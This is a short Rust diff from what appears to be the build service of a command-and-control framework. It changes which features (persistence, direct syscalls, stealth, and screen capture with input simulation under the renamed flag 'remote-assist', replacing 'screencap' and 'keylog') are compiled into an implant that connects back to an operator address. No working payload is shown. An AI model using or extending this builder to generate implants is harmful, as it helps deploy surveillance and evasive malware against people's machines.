@@ -27,9 +27,10 @@ pub struct BuildRequest {
 #[derive(Deserialize, Debug, Clone)]
 pub struct BuildFeatures {
     pub persistence: bool,
-    pub syscalls: bool,
-    pub screencap: bool,
-    pub keylog: bool,
+    /// Enables `direct-syscalls` in the agent (maps to the `direct-syscalls` Cargo feature).
+    pub direct_syscalls: bool,
+    /// Enables `remote-assist` in the agent (screen capture + input simulation).
+    pub remote_assist: bool,
     pub stealth: bool,
 }
 
@@ -245,9 +246,8 @@ fn execute_build_safely(job_id: String, req: BuildRequest, _operator: String, ba
     let c2_addr = format!("{}:{}", req.host, req.port);
     let mut features = vec!["outbound-c".to_string()];
     if req.features.persistence { features.push("persistence".to_string()); }
-    if req.features.syscalls { features.push("syscalls".to_string()); }
-    if req.features.screencap { features.push("screencap".to_string()); }
-    if req.features.keylog { features.push("keylog".to_string()); }
+    if req.features.direct_syscalls { features.push("direct-syscalls".to_string()); }
+    if req.features.remote_assist { features.push("remote-assist".to_string()); }
     if req.features.stealth { features.push("stealth".to_string()); }
 
     let baked_config_path = tmp_path.join("agent/src/baked_config.rs");
